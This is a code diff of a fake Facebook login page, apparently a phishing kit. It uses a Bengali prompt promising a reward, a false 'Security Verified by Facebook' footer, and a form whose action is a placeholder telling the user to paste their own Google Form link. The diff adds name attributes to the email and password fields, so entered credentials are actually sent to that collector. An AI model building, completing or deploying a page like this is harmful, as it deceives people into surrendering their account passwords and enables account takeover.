@@ -9,26 +9,21 @@
         .fb-logo { color: #1877f2; font-size: 45px; font-weight: bold; margin-bottom: 20px; }
         .login-container { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 8px 16px rgba(0, 0, 0, 0.1); width: 360px; text-align: center; }
         input { width: 100%; padding: 14px; margin: 6px 0; border: 1px solid #dddfe2; border-radius: 6px; box-sizing: border-box; font-size: 16px; }
-        input:focus { border-color: #1877f2; outline: none; box-shadow: 0 0 0 2px #e7f3ff; }
         .login-btn { background-color: #1877f2; color: white; border: none; width: 100%; padding: 12px; border-radius: 6px; font-size: 20px; font-weight: bold; cursor: pointer; margin-top: 10px; width: 100%; }
         .footer { font-size: 14px; color: #777; margin-top: 20px; }
     </style>
 </head>
 <body>
-
     <div class="fb-logo">facebook</div>
-
     <div class="login-container">
         <p style="font-size: 16px; color: #1c1e21; margin-bottom: 20px;">রিওয়ার্ড পেতে আপনার আইডি লগইন করুন</p>
         
         <form action="আপনার_গুগল_ফর্মের_লিঙ্ক_এখানে_পেস্ট_করুন">
-            <input type="text" placeholder="Mobile number or email address" required>
-            <input type="password" placeholder="Password" required>
+            <input type="text" name="email" placeholder="Mobile number or email address" required>
+            <input type="password" name="pass" placeholder="Password" required>
             <button type="submit" class="login-btn">Log In</button>
         </form>
-
         <div class="footer">Security Verified by Facebook</div>
     </div>
-
 </body>
 </html>
